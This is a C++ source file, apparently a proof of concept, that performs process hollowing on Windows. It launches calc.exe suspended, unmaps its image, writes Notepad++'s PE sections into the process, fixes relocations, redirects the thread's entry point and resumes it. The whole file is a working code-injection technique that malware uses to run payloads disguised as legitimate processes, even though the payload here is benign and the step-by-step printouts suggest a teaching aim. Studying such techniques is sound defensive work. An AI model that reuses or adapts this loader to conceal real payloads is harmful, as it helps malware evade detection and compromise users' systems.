#include <iostream>
#include <Windows.h>
#include <winternl.h>
# pragma comment (lib, "ntdll.lib")

using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

int main()
{
	LPSTARTUPINFOA si = new STARTUPINFOA();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
	DWORD returnLenght = 0;
	CreateProcessA(NULL, (LPSTR)"c:\\Windows\\SysWOW64\\calc.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
	HANDLE destProcess = pi->hProcess;
	printf("[+]Step1: Process create with PID: %d\n\n", pi->dwProcessId);
	NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLenght);
	DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 8;

	LPVOID destImageBase = 0;
	SIZE_T bytesRead = NULL;
	ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 4, &bytesRead);

	HANDLE sourceFile = CreateFileA("C:\\Program Files (x86)\\Notepad++\\notepad++.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	if (sourceFile == INVALID_HANDLE_VALUE) {
		printf("[-] SourceFile open failed!|n");
		TerminateProcess(pi->hProcess, 0);
		return -1;
	}
	DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
	LPDWORD fileBytesRead = 0;
	LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
	ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);
	printf("[+]Step2: Read file into memory of current process : %#p\n", sourceFileBytesBuffer);
	PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
	printf("\t\t[*] Source DOS header : %#p\n", sourceImageDosHeaders);
	PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
	printf("\t\t[*] Source NT header : %#p\n", sourceImageNTHeaders);
	SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;
	printf("\t\t[*] Number of sections : %d\n\n", sourceImageNTHeaders->FileHeader.NumberOfSections);
	
	printf("[+]Step3: Hollow target process, starting at target's imagebase address : %#p\n", destImageBase);
	NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
	myNtUnmapViewOfSection(destProcess, destImageBase);

	
	LPVOID newDestImageBase = VirtualAllocEx(destProcess, destImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[+]Step4: Allocate memory at target process at: %#p\n\n", newDestImageBase);
	destImageBase = newDestImageBase;
	DWORD deltaImageBase = (DWORD)destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase;

	sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
	WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
	printf("[*] Copy source header to target at : %#p\n", newDestImageBase);
	
	PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
	PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;
	int err = GetLastError();

	
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		PVOID destinationSectionLocation = (PVOID)((DWORD)destImageBase + sourceImageSection->VirtualAddress);
		PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
		WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
		sourceImageSection++;
		printf("\t\t Copied section %d (%.8s) from (current process %#p) in %#p to target process \n", i+1,sourceImageSection->Name, sourceSectionLocation, destinationSectionLocation);
	}

	printf("[+] Step5: Image base relocation\n");
	IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];


	sourceImageSection = sourceImageSectionOld;
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		BYTE* relocSectionName = (BYTE*)".reloc";
		if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0)
		{
			sourceImageSection++;
			continue;
		}

		DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
		DWORD relocationOffset = 0;
	
		while (relocationOffset < relocationTable.Size) {
			PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
			relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
			DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);

			for (DWORD y = 0; y < relocationEntryCount; y++)
			{
				relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

				if (relocationEntries[y].Type == 0)
				{
					continue;
				}

				DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
				DWORD patchedBuffer = 0;
				ReadProcessMemory(destProcess, (LPCVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
				patchedBuffer += deltaImageBase;

				WriteProcessMemory(destProcess, (PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), (SIZE_T*)fileBytesRead);
				int a = GetLastError();
			}
			
		}
	}
	printf("[+]Step6: Update thread context");
	LPCONTEXT context = new CONTEXT();
	context->ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(pi->hThread, context);

	
	DWORD patchedEntryPoint = (DWORD)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
	context->Eax = patchedEntryPoint;
	SetThreadContext(pi->hThread, context);
	ResumeThread(pi->hThread);

	return 0;
}